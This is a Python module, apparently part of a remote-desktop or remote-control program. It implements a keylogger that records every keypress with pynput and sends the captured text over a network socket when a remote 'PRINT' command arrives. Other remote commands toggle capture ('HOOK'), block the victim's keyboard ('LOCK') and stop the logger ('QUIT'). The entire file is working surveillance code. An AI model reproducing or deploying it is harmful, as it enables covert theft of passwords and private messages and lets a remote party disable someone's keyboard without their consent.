import threading

import keyboard
from RD_Constant import BUFFERSIZE, FORMAT
from pynput.keyboard import Listener


def keylogger(key):
    global cont, flag
    if flag == 4:
        return False
    if flag == 1:
        temp = str(key)
        if temp == "Key.space":
            temp = " "
        elif temp == '"\'"':
            temp = "'"
        else:
            temp = temp.replace("'", "")
        cont += str(temp)
    return


def _print(client):
    global cont
    client.sendall(bytes(cont, "utf8"))
    cont = " "
    return


def listen():
    with Listener(on_press=keylogger) as listener:
        listener.join()
    return


def lock():
    global islock
    if islock == 0:
        for i in range(150):
            keyboard.block_key(i)
        islock = 1
    else:
        for i in range(150):
            keyboard.unblock_key(i)
        islock = 0
    return


def key_log(client):
    global cont, flag, islock, ishook
    islock = 0
    ishook = 0
    threading.Thread(target=listen).start()
    flag = 0
    cont = " "
    message = ""
    while True:
        message = client.recv(BUFFERSIZE).decode(FORMAT)
        if "HOOK" in message:
            if ishook == 0:
                flag = 1
                ishook = 1
            else:
                flag = 2
                ishook = 0
        elif "PRINT" in message:
            _print(client)
        elif "LOCK" in message:
            lock()
        elif "QUIT" in message:
            flag = 4
            return
    return
